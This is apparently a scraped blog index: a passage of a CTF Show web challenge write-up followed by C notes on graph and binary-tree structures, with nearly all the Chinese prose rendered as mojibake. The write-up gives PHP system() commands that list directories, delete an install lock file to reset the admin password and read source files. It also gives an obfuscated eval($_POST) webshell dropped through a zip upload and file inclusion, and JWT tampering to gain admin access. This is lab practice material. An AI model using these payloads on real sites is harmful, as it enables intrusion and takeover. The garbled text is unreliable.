1234567891011121314151617181920212223242526272829303132&lt;?php system(&#x27;ls /var/www/html/&#x27;);alsckdfyclear.phpdebugindex.phpinstalllayuipage.phppage_1.phppage_2.phppage_3.phppage_4.phprobots.txt&lt;?php system(&#x27;ls /&#x27;); ?&gt;bindevetchomelibmediamntoptprocrootrunsbinsrvsystmpusrvar çœ‹æ ·å­æ²¡æœ‰ flag é‚£ä¹ˆæ ¹æ®ä¹‹å‰çš„æ€è·¯ï¼Œæˆ‘ä»¬åªè¦æŠŠ lock.dat åˆ æ‰ï¼Œé‚£ä¹ˆå°±å¯ä»¥é‡ç½®ç®¡ç†å‘˜å¯†ç ï¼Œå°±èƒ½å¤ŸæˆåŠŸç™»å½• 123&lt;?php system(&#x27;rm ../install/lock.dat&#x27;); ?&gt;ç„¶åæˆ‘ä»¬å¯ä»¥å†è¿›è¡ŒéªŒè¯ä¸€ä¸‹&lt;?php system(&#x27;ls ../install/&#x27;); ?&gt; æ­¤æ—¶å†è®¿é—® install ï¼Œå·²ç»å˜æˆ ç„¶åè¿›å…¥åå°ç™»é™†å³å¯ admin888 æœ€åæ‰æƒ³åˆ°ï¼Œflag åº”è¯¥æ˜¯å‡ºç°åœ¨ ç™»é™†æˆåŠŸä¹‹åçš„é¡µé¢é‡Œçš„ï¼Œä¹Ÿå°±æ˜¯ /alsckdfy/check.php ï¼Œæ‰€ä»¥æˆ‘ä»¬ä¹Ÿå®Œå…¨å¯ä»¥ 1&lt;?php system(&#x27;cat ../alsckdfy/check.php&#x27;); ?&gt; å³å¯æŸ¥åˆ° 1.8 Web 388æŒ‰ç…§ä¹‹å‰çš„æ€è·¯æ¥ çœ‹äº†å…¶å®ƒå¤§ç¥çš„è§£ï¼Œå‘ç°åœ¨åå°è¿˜æœ‰ /editor/ ç›®å½•ï¼Œä¸€æ‰«ï¼Œæœç„¶ é‚£ä¹ˆå°±ä¸€å®šå­˜åœ¨æ–‡ä»¶ä¸Šä¼ çš„é—®é¢˜ alsckdfy/editor æ–‡ä»¶ä¸Šä¼  /debug?file= è¿›è¡Œæ–‡ä»¶åŒ…å«ï¼Œå†™å…¥ .php æ–‡ä»¶ è®¿é—® .php æ–‡ä»¶ï¼Œè¿›è¡Œå‘½ä»¤æ‰§è¡Œ æˆ‘æƒ³ç€å†™å®Œä¹‹åæäº¤ï¼Œå±…ç„¶è¿˜æœªå¼€æ”¾ï¼Œé‚£å°±åªå¥½ ä¸Šä¼ æ–‡ä»¶äº† KindEditor 4.1.11 (2016-03-31) ç½‘ä¸ŠæŸ¥æ‰¾ç›¸å…³æ¼æ´ 123# æˆ‘å°è¯•äº†ä¸€ä¸‹/alsckdfy/editor/php/file_manager_json.php?path=/# å±…ç„¶ä¸è¡Œ é‚£å°±åˆ«æƒ³ç€ ç¼–è¾‘å™¨çš„ ä»»æ„æ–‡ä»¶éå†çš„ æ¼æ´äº†ï¼Œè€è€å®å®ä¸Šä¼ æ–‡ä»¶å§ 1234567# æœ¬åœ°çš„ 2.zip å…æ€ğŸ&lt;?php$s=&#x27;&lt;?ph&#x27;.&#x27;p ev&#x27;.&#x27;al($_PO&#x27;.&#x27;ST[1])&#x27;.&#x27;;?&gt;&#x27;;file_put_contents(&#x27;/var/www/html/2.php&#x27;,$s);# è·¯å¾„ # /alsckdfy/attached/file/20210804/20210804083008_10879.zip å¯ä»¥çœ‹åˆ°æœ‰é™åˆ¶ï¼Œæˆ‘ä»¬å¯ä»¥ä¸Šä¼  .zip æ–‡ä»¶ ç„¶ååŒ…å«ï¼Œæˆ‘ä»¬å°†å®ƒå†™åˆ° ç½‘ç«™æ ¹ç›®å½•ä¸‹ 1/debug/?file=/var/www/html/alsckdfy/attached/file/20210804/20210804083008_10879.zip å¯ä»¥çœ‹åˆ°ï¼Œä¸Šä¼ æˆåŠŸ ç›´æ¥å‘½ä»¤æ‰§è¡Œï¼ŒæŸ¥çœ‹æºç å¾—åˆ° 1.9 Web 389æŒ‰ç…§ä¸Šé¢æ€è·¯ æƒé™ä¸è¶³ï¼Œæ‰¾ cookie 1eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJhZG1pbiIsImlhdCI6MTYyODA2Njc0NiwiZXhwIjoxNjI4MDczOTQ2LCJuYmYiOjE2MjgwNjY3NDYsInN1YiI6InVzZXIiLCJqdGkiOiIwMDRmYzQzMjU0ODI3MGVlYTc4Mjg3MTg5ZWE2YjNkOCJ9.PWduIXmiYUefpQpuTkyCxMmg7IWvRvWqyC1rJZA8aIs jwt åœ¨çº¿ è§£å¯† https://jwt.io/ ç„¶åæˆ‘ä»¬ä¿®æ”¹ä¸º admin æ›´æ”¹ä¹‹ååˆ·æ–°ï¼Œå›åˆ°ä¸Šä¸€å…³ /alsckdfy/attached/file/20210804/20210804085256_19145.zip","categories":[{"name":"CTF Show","slug":"CTF-Show","permalink":"https://xizhi-future.github.io/categories/CTF-Show/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://xizhi-future.github.io/tags/CTF/"}],"author":"xizhi-future"},{"title":"å›¾","slug":"å›¾","date":"2021-11-14T09:36:24.000Z","updated":"2021-11-14T09:37:30.447Z","comments":true,"path":"2021/11/14/å›¾/","link":"","permalink":"https://xizhi-future.github.io/2021/11/14/%E5%9B%BE/","excerpt":"","text":"ä¸€ã€å›¾çš„åŸºæœ¬å­˜å‚¨ç»“æ„éœ€è¦å­˜å‚¨çš„å†…å®¹ï¼šå­˜å‚¨ é¡¶ç‚¹ä¿¡æ¯ã€é¡¶ç‚¹ä¹‹é—´çš„å…³ç³» ä¸‰ç§å¸¸ç”¨çš„ å›¾çš„ å­˜å‚¨ç»“æ„ï¼š é‚»æ¥çŸ©é˜µ é‚»æ¥è¡¨ ä¸´ç•Œå¤šé‡é“¾è¡¨ 1.1 é‚»æ¥çŸ©é˜µå­˜å‚¨ç»“æ„ï¼š ä¸€ç»´æ•°ç»„ï¼ˆé¡ºåºè¡¨ï¼‰â€”â€” å­˜å‚¨ æ•°æ®å…ƒç´ çš„ä¿¡æ¯ äºŒç»´æ•°ç»„ï¼ˆé‚»æ¥çŸ©é˜µï¼‰â€”â€” å­˜å‚¨ æ•°æ®å…ƒç´ ä¹‹é—´çš„ å…³ç³» ç‰¹ç‚¹ï¼š æ— å‘å›¾çš„é‚»æ¥çŸ©é˜µ ä¸€å®šæ˜¯å¯¹ç§°çš„ï¼Œå¯ä½¿ç”¨ ä¸Šä¸‰è§’æˆ–è€…æ˜¯ ä¸‹ä¸‰è§’è¿›è¡Œå‹ç¼©å­˜å‚¨ï¼Œå…¶å­˜å‚¨ç©ºé—´åªéœ€è¦ n(n+1)/2 æœ‰å‘å›¾çš„é‚»æ¥çŸ©é˜µ ä¸ä¸€å®šæ˜¯ å¯¹ç§°çš„ï¼Œå…¶å­˜å‚¨ç©ºé—´ä¸º n çš„å¹³æ–¹ 1234567891011#include&lt;stdio.h&gt;#define FINITY 5000 //æ­¤å¤„ä½¿ç”¨ 5000 è¡¨ç¤ºæ— ç©·å¤§#define M 20 //æœ€å¤§é¡¶ç‚¹æ•°typedef char vertextype;//é¡¶ç‚¹å€¼ç±»å‹typedef int edgetype; //æƒå€¼ç±»å‹typedef struct&#123; //é‚»æ¥çŸ©é˜µ ç±»å‹ vertextype vexs[M]; //é¡¶ç‚¹ä¿¡æ¯åŸŸï¼ˆä¸€ç»´æ•°ç»„ï¼‰ edgetype edges[M][M]; //é‚»æ¥çŸ©é˜µï¼ˆäºŒç»´æ•°ç»„ï¼‰ int n,e; //å›¾ä¸­é¡¶ç‚¹æ€»æ•° ä¸ è¾¹æ•°&#125;Mgraph; å»ºç«‹ç½‘ç»œçš„ é‚»æ¥çŸ©é˜µç®—æ³•ï¼š 1234567891011121314151617181920212223void creat(Mgraph *g,char *s,int c)&#123; //c=1è¡¨ç¤ºå»ºç«‹æœ‰å‘å›¾ï¼Œc=0 è¡¨ç¤ºå»ºç«‹æ— å‘å›¾ int i,j,k,w; FILE *rf; rf = fopen(s,&quot;r&quot;); if(rf)&#123; fscanf(rf,&quot;%d%d&quot;,&amp;g-&gt;n,&amp;g-&gt;e); for(i=0;i&lt;g-&gt;n;i++) fscanf(rf,&quot;%ls&quot;,&amp;g-&gt;vexs[i]); for(i=0; i&lt;g-&gt;n;i++) for(j=0;j&lt;g-&gt;n;j++) if(i == j) g-&gt;edges[i][j] = FINITY; for(k=0;k&lt;g-&gt;e;k++)&#123; fscanf(rf,&quot;%d%d%d&quot;,&amp;i,&amp;j,&amp;w); g-&gt;edges[i][j] = w; if(c == 0) g-&gt;edges[j][i] = w; &#125; fclose(rf); &#125; else g-&gt;n = 0;&#125; ç¼ºç‚¹ï¼šé‚»æ¥çŸ©é˜µæ³•ï¼Œå ç”¨çš„å­˜å•å…ƒåªä¸å›¾ä¸­é¡¶ç‚¹çš„ä¸ªæ•°æœ‰å…³ï¼Œä¸è¾¹æ•°æ— å…³ï¼Œå¦‚æœä¸€ä¸ªå›¾ä¸­çš„è¾¹æ•°æ¯”ç»“ç‚¹ä¸ªæ•°å°‘å¾—å¤šï¼Œåˆ™è¯¥é‚»æ¥çŸ©é˜µä¸­å°±ä¼šå‡ºç°å¾ˆå¯¹çš„ç©ºå…ƒç´ ï¼Œä»è€Œæµªè´¹ç©ºé—´ã€‚ 1.2 é‚»æ¥è¡¨å­˜å‚¨ç»“æ„ï¼š å¤´ç»“ç‚¹ï¼šä¸¤ä¸ªåŸŸâ€”â€“æ•°æ®åŸŸ vertex ï¼Œå¤´æŒ‡é’ˆåŸŸ firstedge è¡¨ç»“ç‚¹ï¼šä¸¤ä¸ªåŸŸâ€”â€“é‚»æ¥ç‚¹åŸŸ adjvex ï¼Œé“¾åŸŸ next å¦‚æœæ˜¯ç½‘ç»œï¼Œå¸¦æƒå€¼ï¼Œåˆ™å¯åœ¨å¤´ç»“ç‚¹ä¸­æ·»åŠ ä¸€ä¸ªæ•°æ®åŸŸæ¥å­˜å‚¨æƒå€¼ å‡ºè¾¹è¡¨ï¼ˆæœ‰å‘å›¾çš„é‚»æ¥è¡¨ï¼‰ã€å…¥è¾¹è¡¨ï¼ˆé€†é‚»æ¥è¡¨ï¼‰ å¦‚æœå›¾ä¸­å«æœ‰ n ä¸ªé¡¶ç‚¹ï¼Œe æ¡è¾¹ï¼Œåˆ™å®ƒçš„é‚»æ¥è¡¨å­˜å‚¨ç»“æ„éœ€è¦ nä¸ªå¤´ç»“ç‚¹å’Œ 2e ä¸ªè¾¹ç»“ç‚¹ 123456789101112131415161718#include&lt;stdio.h&gt;#include&lt;stdlib.h&gt;#define M 20 //é¢„å®šä¹‰å›¾çš„æœ€å¤§é¡¶ç‚¹æ•°typedef char DataType; //é¡¶ç‚¹ä¿¡æ¯æ•°æ®ç±»å‹typedef struct node&#123; //è¾¹è¡¨ç»“ç‚¹ int adjvex; //é‚»æ¥ç‚¹ struct node *next; //æŒ‡å‘ä¸‹ä¸€ä¸ªé‚»æ¥ç‚¹&#125;EdgeNode;typedef struct vnode&#123; //å¤´ç»“ç‚¹ç±»å‹ DataType vertex; //é¡¶ç‚¹ä¿¡æ¯ EdgeNode *FirstEdge;//é‚»æ¥é“¾è¡¨å¤´æŒ‡é’ˆ&#125;VertexNode; typedef struct&#123; //é‚»æ¥è¡¨ ç±»å‹ VertexNode adjlist[M];//å­˜æ”¾å¤´ç»“ç‚¹çš„é¡ºåºè¡¨ int n,e; //å›¾çš„é¡¶ç‚¹æ•°ã€è¾¹æ•°&#125;LinkedGraph; æ— å‘å›¾é‚»æ¥è¡¨å»ºç«‹ç®—æ³•ï¼š 123456789101112131415161718192021222324252627282930//é‚»æ¥è¡¨ åˆ›å»ºå›¾void create(LinkedGraph *g,char *filename,int c)&#123; //c=0 è¡¨ç¤ºå»ºç«‹æ— å‘å›¾ int i,j,k; EdgeNode *s; FILE *fp; fp = fopen(filename,&quot;r&quot;); if(fp)&#123; fscanf(fp,&quot;%d%d&quot;,&amp;g-&gt;n,&amp;g-&gt;e); //è¯»å…¥é¡¶ç‚¹æ•°ä¸è¾¹æ•° for(i=0 ;i&lt;g-&gt;n;i++)&#123; fscanf(fp,&quot;%ls&quot;,&amp;g-&gt;adjlist[i].vertex); //è¯»å…¥é¡¶ç‚¹ä¿¡æ¯ g-&gt;adjlist[i].FirstEdge = NULL; //è¾¹è¡¨ç½®ä¸ºç©ºè¡¨ &#125; for(k=0; k &lt; g-&gt;n; k++)&#123; fscanf(fp,&quot;%d%d&quot;,&amp;i,&amp;j); //è¾“å…¥æ— åºå¯¹ s = (EdgeNode *)malloc(sizeof(EdgeNode)); s-&gt;adjvex = j; s-&gt;next = g-&gt;adjlist[i].FirstEdge; g-&gt;adjlist[i].FirstEdge = s; //ç›¸å½“äº å‰æ’ if(c == 0)&#123; //æ— å‘å›¾ s = (EdgeNode *)malloc(sizeof(EdgeNode)); s-&gt;adjvex = i; s-&gt;next = g-&gt;adjlist[j].FirstEdge; g-&gt;adjlist[j].FirstEdge = s; &#125; &#125; fclose(fp); &#125; else //æ–‡ä»¶æ‰“å¼€å¤±è´¥ g-&gt;n = 0; &#125; æ³¨æ„ï¼šæ–‡ä»¶è¾“å…¥ æ•°æ®å†…å®¹æ—¶ï¼Œç¬¬ä¸€è¡Œçš„ç»“ç‚¹ä¸ªæ•°ä¸å˜ï¼Œä¸º nï¼Œä½†æ˜¯è¾¹æ•°å¾—æ˜¯ 2e 1.3 é‚»æ¥å¤šé‡è¡¨è¾¹è¡¨ç»“ç‚¹ï¼šäº”ä¸ªåŸŸ mark æ ‡å¿—åŸŸï¼ˆæ˜¯å¦è¢«è®¿é—®è¿‡ï¼‰ vexi vexj è¯¥è¾¹ä¸¤ä¸ªé¡¶ç‚¹åœ¨å›¾ä¸­çš„ä½åº linki linkj ä¸¤ä¸ªè¾¹ç»“ç‚¹çš„æŒ‡é’ˆ linki æŒ‡å‘å…³è”ä¸ vexi ç»“ç‚¹çš„ä¸‹ä¸€æ¡è¾¹ linkj æŒ‡å‘å…³è”ä¸ vexj ç»“ç‚¹çš„ä¸‹ä¸€æ¡è¾¹ è¡¨å¤´ç»“ç‚¹ï¼šä¸¤ä¸ªåŸŸ vertex é¡¶ç‚¹ä¿¡æ¯ firstedge å…³è”ä¸ é¡¶ç‚¹ çš„ ç¬¬ä¸€æ¡è¾¹ äºŒã€å›¾çš„éå†2.1 æ·±åº¦ä¼˜å…ˆéå†è®¿é—®é¡ºåºåŸŸå›¾çš„é‚»æ¥è¡¨çš„å­˜å‚¨çŠ¶æ€æœ‰å…³ï¼Œç”±äºå›¾çš„é‚»æ¥è¡¨å­˜å‚¨ä¸æ˜¯å”¯ä¸€çš„ï¼Œåˆ™å¯¹äºåŒä¸€ä¸ªå›¾ï¼Œå…¶æ·±åº¦ä¼˜å…ˆéå†çš„è¾“å‡ºç»“æœä¹Ÿæ˜¯ä¸åŒçš„ã€‚ 1234567891011121314151617181920212223int visited[M]; //ä½œä¸ºè®¿é—®çš„æ ‡è®°//æ·±åº¦ä¼˜å…ˆéå† ç®—æ³•void dfs(LinkedGraph g,int i)&#123; EdgeNode *p; printf(&quot;visit vertex: %c\\n&quot;,g.adjlist[i].vertex); //è®¿é—®é¡¶ç‚¹ i visited[i] = 1; //è¡¨ç¤ºå·²ç»è®¿é—®è¿‡ p = g.adjlist[i].FirstEdge; //ä» p çš„é‚»æ¥ç‚¹å¼€å§‹è¿›è¡Œ æ·±åº¦ä¼˜å…ˆéå† while(p)&#123; if(!visited[p-&gt;adjvex]) dfs(g,p-&gt;adjvex); p = p-&gt;next; &#125;&#125;void DfsTraverse(LinkedGraph g)&#123; int i; for(i = 0;i &lt;g.n; i++) visited[i] = 0; //åˆå§‹åŒ–éƒ½ä¸º 0 ï¼Œä»£è¡¨éƒ½æœªè¢«è®¿é—®è¿‡ for(i=0; i&lt;g.n; i++) if(!visited[i]) //å¦‚æœ i æœªè¢«è®¿é—®è¿‡ dfs(g,i);&#125; 2.2 å¹¿åº¦ä¼˜å…ˆéå†ç‰¹ç‚¹ï¼šå°½å¯èƒ½åœ°é¦–å…ˆå¯¹ æ¨ªå‘ç»“ç‚¹è¿›è¡Œè®¿é—® ä½¿ç”¨é˜Ÿåˆ—ï¼Œä½¿ç”¨é‚»æ¥è¡¨å­˜å‚¨ç»“æ„ 1234567891011121314151617181920212223242526272829303132333435363738int visited[M]; //å…¨å±€æ ‡å¿—ï¼šæ˜¯å¦è®¿é—®è¿‡//å¹¿åº¦ä¼˜å…ˆéå† ç®—æ³•void bfs(LinkedGraph g,int i)&#123; int j; EdgeNode *p; int queue[M],front,rear; //FIFO é˜Ÿåˆ— front = rear = 0; //åˆå§‹åŒ–ç©ºé˜Ÿåˆ— printf(&quot;%c&quot;,g.adjlist[i].vertex); visited[i] = 1; queue[rear++] = i; //è¢«è®¿é—®ç»“ç‚¹è¿›å…¥é˜Ÿåˆ— while(rear &gt; front)&#123; j = queue[front++]; // å‡ºé˜Ÿ p = g.adjlist[j].FirstEdge; while(p)&#123; if(visited[p-&gt;adjvex] == 0)&#123; printf(&quot;%c&quot;,g.adjlist[p-&gt;adjvex].vertex); queue[rear++] = p-&gt;adjvex; visited[p-&gt;adjvex] = 1; &#125; p = p-&gt;next; &#125; &#125; printf(&quot;\\n&quot;);&#125;//è¿”å›è¿é€šåˆ†é‡çš„ä¸ªæ•°int BfsTraverse(LinkedGraph g)&#123; int i,count = 0; for(i=0;i&lt;g.n;i++) visited[i] = 0; //åˆå§‹åŒ–æ ‡å¿—æ•°ç»„ï¼Œéƒ½æœªè¢«è®¿é—®è¿‡ for(i=0 ;i&lt;g.n ;i++) if(!visited[i])&#123; //viæœªè¢«è®¿é—®è¿‡ //printf(&quot;\\n&quot;); count++; //è®¡æ•°å™¨ï¼šè¿é€šåˆ†é‡ ä¸ªæ•°åŠ 1 bfs(g,i); &#125; return count;&#125; 12345678int main()&#123; LinkedGraph g; int count; create(&amp;g,&quot;g7.txt&quot;,0); // 0 ä»£è¡¨æ— å‘å›¾ count = BfsTraverse(g); printf(&quot;\\n è¯¥å›¾å…±æœ‰ %d ä¸ªè¿é€šåˆ†é‡ã€‚\\n&quot;,count); return 0;&#125;","categories":[{"name":"æ•°æ®ç»“æ„","slug":"æ•°æ®ç»“æ„","permalink":"https://xizhi-future.github.io/categories/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"}],"tags":[],"author":"xizhi-future"},{"title":"äºŒå‰æ ‘","slug":"äºŒå‰æ ‘","date":"2021-11-13T01:02:23.000Z","updated":"2021-11-14T09:28:48.479Z","comments":true,"path":"2021/11/13/äºŒå‰æ ‘/","link":"","permalink":"https://xizhi-future.github.io/2021/11/13/%E4%BA%8C%E5%8F%89%E6%A0%91/","excerpt":"","text":"äºŒå‰æ ‘1.1 æ¦‚å¿µç”±ç»“ç‚¹æ„æˆçš„æœ‰é™é›†åˆï¼Œé›†åˆå¯ä¸ºç©ºï¼Œæˆ–è€…æ˜¯ç”±ä¸€ä¸ªæ ¹ç»“ç‚¹ä»¥åŠä¸¤é¢—äº’ä¸ç›¸äº¤çš„åˆ†åˆ«ç§°ä½œ è¯¥æ ¹ç»“ç‚¹çš„å·¦å­æ ‘åŸŸå³å­æ ‘çš„äºŒå‰æ ‘ç»„æˆã€‚ ç©ºäºŒå‰æ ‘ äºŒå‰æ ‘äº”ç§åŸºæœ¬å½¢æ€ äºŒå‰æ ‘ä¸ä¸€èˆ¬çš„æ ‘å‹ç»“æ„çš„åŒºåˆ«åœ¨äºï¼š äºŒå‰æ ‘ä¸­æ¯ä¸ªéç©ºç»“ç‚¹æœ€å¤šåªæœ‰ä¸¤ä¸ªå­å¥³ï¼Œè€Œä¸€èˆ¬çš„æ ‘å‹ç»“æ„ä¸­æ¯ä¸ªéç©ºç»“ç‚¹å¯ä»¥æœ‰0åˆ°å¤šä¸ªå­å¥³; äºŒå‰æ ‘ä¸­ç»“ç‚¹çš„å­æ ‘è¦åŒºåˆ†å·¦å­æ ‘å’Œå³å­æ ‘ï¼Œå³ä½¿åœ¨ç»“ç‚¹åªæœ‰ä¸€æ£µå­æ ‘çš„æƒ…å†µä¸‹ä¹Ÿè¦æ˜ç¡®æŒ‡å‡ºæ˜¯å·¦å­æ ‘è¿˜æ˜¯å³å­æ ‘ã€‚ 1.2 äºŒå‰æ ‘ æ€§è´¨ æ€§è´¨1ï¼šä¸€æ£µéç©ºäºŒå‰æ ‘çš„ ç¬¬iå±‚ ä¸Šè‡³å¤šæœ‰ 2 çš„ i-1 æ¬¡æ–¹ ä¸ª ç»“ç‚¹ (iâ‰¥1)ã€‚ æ€§è´¨2ï¼šæ·±åº¦ä¸ºhçš„äºŒå‰æ ‘è‡³å¤šæœ‰ 2 çš„ h æ¬¡æ–¹ -1 ä¸ªç»“ç‚¹(h&gt;1) ã€‚ æ€§è´¨3ï¼š å¯¹äºä»»ä½•ä¸€æ£µäºŒå‰æ ‘Tï¼Œå¦‚æœå…¶ç»ˆç«¯ç»“ç‚¹æ•°ä¸ºnoï¼Œåº¦ä¸º2çš„ç»“ç‚¹æ•°ä¸ºn2ï¼Œåˆ™ no=n2+1ã€‚ æ€§è´¨4ï¼šå…·æœ‰ n ä¸ªç»“ç‚¹çš„å®Œå…¨äºŒå‰æ ‘çš„æ·±åº¦ æ˜¯ [logä»¥2ä¸ºåº•nçš„å¯¹æ•°] + 1 å…¶å®ƒæ€§è´¨ï¼š å®Œå…¨äºŒå‰æ ‘ã€æ»¡äºŒå‰æ ‘ï¼š å®Œå…¨äºŒå‰æ ‘çš„æ€§è´¨ï¼š 1.3 äºŒå‰æ ‘çš„ å­˜å‚¨ç»“æ„1.3.1 å®Œå…¨äºŒå‰æ ‘ çš„ é¡ºåºå­˜å‚¨æŒ‰ç…§ äºŒå‰æ ‘ ä»ä¸Šåˆ°ä¸‹ã€åŒä¸€å±‚æ¬¡ ä»å·¦åˆ°å³çš„é¡ºåºï¼Œä¾æ¬¡å°†ç»“ç‚¹å­˜å‚¨åœ¨ ä¸€ä¸ª ä¸€ç»´æ•°ç»„ ä¸­ã€‚ åˆ©ç”¨å®Œå…¨äºŒå‰æ ‘çš„æ€§è´¨ 1234#define MAXSIZE 20typedef char datatype; //äºŒå‰æ ‘ç»“ç‚¹ç±»å‹datatype tree[MAXSIZE];int n; //æ ‘ å®é™…æ‰€å«ç»“ç‚¹ä¸ªæ•° 1.3.2 ä¸€èˆ¬äºŒå‰æ ‘ çš„ é¡ºåºå­˜å‚¨æ¯ä¸ªç»“ç‚¹ï¼šä¸‰ä¸ªåŸŸ å€¼åŸŸï¼šdata ä¸å¸¦åŒäº²ï¼š 12345678910#define MAXSIZE 20typedef char datatype;typedef struct&#123; //ç»“ç‚¹å€¼ç±»å‹ datatype data; int lchild,rchild; //å­˜æ”¾ å·¦ã€å³ å­å¥³ä¸‹æ ‡&#125;node;node tree[MAXSIZE]; int n; //æ ‘ä¸­å®é™…æ‰€å«ç»“ç‚¹ä¸ªæ•°int root; //å­˜æ”¾æ ¹ç»“ç‚¹çš„ä¸‹æ ‡ å¸¦åŒäº²ï¼š 1234567891011#define MAXSIZE 20typedef char datatype;typedef struct&#123; datatype data; int lchild,rchild; int parent; //å­˜æ”¾åŒäº²ç»“ç‚¹ä¸‹æ ‡&#125;node;node tree[MAXSIZE];int n;int root; 1.3.2 é“¾å¼å­˜å‚¨æ¯ä¸ªç»“ç‚¹ï¼šä¸‰ä¸ªåŸŸ å€¼åŸŸï¼šdata æŒ‡é’ˆåŸŸï¼šåˆ†åˆ«æŒ‡å‘å·¦å³å­æ ‘ ä¸å¸¦åŒäº²ï¼š 12345678typedef char datatype;typedef struct node&#123; //äºŒå‰æ ‘ç»“ç‚¹ç±»å‹ datatype data; struct node *lchild,*rchild; //æŒ‡å‘å·¦å³å­æ ‘çš„æŒ‡é’ˆ&#125;bintnode;typedef bintnode *bintree;bintree root; å¸¦åŒäº²ï¼š 123456789typedef char datatype;typedef struct node&#123; //äºŒå‰æ ‘ç»“ç‚¹ç±»å‹ datatype data; struct node *lchild,*rchild; struct node *parent; //æŒ‡å‘åŒäº²çš„æŒ‡é’ˆ&#125;bintnode;typedef bintnode *bintree;bintree root; //æŒ‡å‘äºŒå‰æ ‘æ ¹ç»“ç‚¹çš„æŒ‡é’ˆ 1.4 äºŒå‰æ ‘çš„éå† â€”â€“ é€’å½’å®ç°æŒ‰ç…§ä¸€å®šçš„é¡ºåºå¯¹äºŒå‰æ ‘è¿™æ¯ä¸ªç»“ç‚¹è¿›è¡Œè®¿é—®ï¼Œä¸”åªèƒ½è®¿é—®ä¸€æ¬¡ã€‚ 1.4.1 å‰åºéå† â€”- æ ¹-&gt;å·¦-&gt;å³1234567void preorder(bintree t)&#123; if(t)&#123; printf(&quot;%c&quot;,t-&gt;data); preorder(t-&gt;lchild); preorder(t-&gt;rchild); &#125;&#125; 1.4.2 ä¸­åºéå† â€”- å·¦-&gt;æ ¹-&gt;å³1234567void inorder(bintree t)&#123; if(t)&#123; inorder(t-&gt;lchild); printf(&quot;%c&quot;,t-&gt;data); inorder(t-&gt;rchild); &#125;&#125; 1.4.3 ååºéå† â€”- å·¦-&gt;å³-&gt;æ ¹1234567void postorder(bintree t)&#123; if(t)&#123; postorder(t-&gt;lchild); postorder(t-&gt;rchild); printf(&quot;%c&quot;,t-&gt;data); &#125;&#125; 1.5 äºŒå‰æ ‘çš„åˆ›å»º123456789101112131415//æŒ‰ç…§å‰åºéå†çš„ç»“æœåˆ›å»ºä¸€é¢— ç»™å®š äºŒå‰æ ‘bintree createbintree()&#123; char ch; bintree t; if((ch = getchar()) == &#x27;#&#x27;) //ç©ºå­æ ‘ t = NULL; else &#123; t = (bintree *)malloc(sizeof(bintnode)); t-&gt;data = ch; t-&gt;lchild = createbintree(); t-&gt;rchild = createbintree(); &#125; return t;&#125;//æ³¨ï¼šè¾“å…¥æ—¶ï¼Œå¿…é¡»æŒ‰ç…§ å‰åºéå† çš„é¡ºåºè¿›è¡Œè¾“å…¥ 1.6 äºŒå‰æ ‘çš„éå† â€”â€“ éé€’å½’å®ç°äºŒå‰æ ‘çš„ é€’å½’éå† ç®—æ³•è¾ƒç®€æ˜“ï¼Œä½†æ˜¯è¿è¡Œæ—¶é—´é•¿ï¼Œæ‰§è¡Œæ•ˆç‡è¾ƒä½ï¼Œä¸‹é¢æ˜¯éé€’å½’ç®—æ³•å®ç°äºŒå‰æ ‘çš„éå†ã€‚ ä½¿ç”¨ä¸€ä¸ª æ ˆ æ¥è¿›è¡Œå›æº¯ 123456789101112131415161718192021//é¡ºåºæ ˆçš„å®šä¹‰typedef struct stack&#123; bintree data[100]; int tag[100]; //ä¸ºæ ˆä¸­æ¯ä¸ªå…ƒç´ è®¾ç½®çš„æ ‡è®°ï¼Œä¾¿äº ååºéå† int top; //æ ˆé¡¶æŒ‡é’ˆ&#125;seqstack;//è¿›æ ˆvoid push(seqstack *s,bintree)&#123; s-&gt;data[s-&gt;top] = t; s-&gt;top++;&#125;//å‡ºæ ˆbintree pop(seqstack *s)&#123; if(s-&gt;top != 0)&#123; //åˆ¤ç©º s-&gt;top--; return(s-&gt;data[s-&gt;top]); &#125; return NULL;&#125; 1.6.1 å‰åºéå† â€”- æ ¹-&gt;å·¦-&gt;å³ å½“è®¿é—®å®Œ æ ¹ç»“ç‚¹ä¹‹åï¼Œç´§æ¥ç€è¯¥è®¿é—®å…¶å·¦å­æ ‘ï¼Œä½†å‰ææ˜¯å¿…é¡»å…ˆä½¿ å½“å‰ç»“ç‚¹æ”¾äº æ ˆä¸­ä¿å­˜èµ·æ¥ï¼Œä¾¿äºä¹‹å å³å­æ ‘çš„è®¿é—®ã€‚ å½“æ ˆä¸­çš„å…ƒç´ ä½äºæ ˆé¡¶å³å°†å‡ºæ ˆæ—¶ï¼Œåˆ™æ„å‘³ç€æ ¹ç»“ç‚¹å’Œå·¦å­æ ‘å·²ç»è®¿é—®å®Œæˆï¼Œå‡ºæ ˆä¹‹åå³å¯è¿›è¡Œå³å­æ ‘çš„è®¿é—®ã€‚ 1234567891011121314void preorder(bintree t)&#123; seqstack s; s.top = 0; while((t) || (s.top!=0))&#123; //å½“å‰å¤„ç†çš„å­æ ‘ä¸ä¸ºç©ºæ ˆ æˆ– æ ˆä¸ä¸ºç©º æ—¶ if(t)&#123; printf(&quot;%c&quot;,t-&gt;data); push(&amp;s,t); t = t-&gt;lchild; &#125;else&#123; t = pop(&amp;s); t = t-&gt;rchild; &#125; &#125;&#125; 1.6.2 ä¸­åºéå† â€”- å·¦-&gt;æ ¹-&gt;å³ é¦–å…ˆè®¿é—® å·¦å­æ ‘ï¼Œä½†ç”±äºæ­¤æ—¶ æ ¹ç»“ç‚¹å’Œ å³å­æ ‘éƒ½æœªè¿›è¡Œè®¿é—®ï¼Œåˆ™ éœ€è¦å°†å…¶ å…ˆæ”¾å…¥æ ˆä¸­ä¿å­˜èµ·æ¥ï¼Œä»¥ä¾¿ä¹‹åå¯¹æ ¹ç»“ç‚¹å’Œå³å­æ ‘çš„è®¿é—®ã€‚ å½“æ ˆä¸­å…ƒç´ ä½äºæ ˆé¡¶å³å°†å‡ºæ ˆæ—¶ï¼Œå³æ„å‘³ç€å…¶å·¦å­æ ‘å·²ç»è®¿é—®å®Œæˆï¼Œå‡ºæ ˆå åˆ™å¯ è¿›è¡Œæ ¹ç»“ç‚¹å’Œå³å­æ ‘çš„è®¿é—®ã€‚ 1234567891011121314void inorder(bintree t)&#123; seqstack s; s.top = 0; while((t!=NULL) || (s.top!=0))&#123; if(t)&#123; push(&amp;s,t); t = t-&gt;lchild; &#125;else&#123; t = pop(&amp;s); printf(&quot;%c&quot;,t-&gt;data); t = t-&gt;rchild; &#125; &#125;&#125; 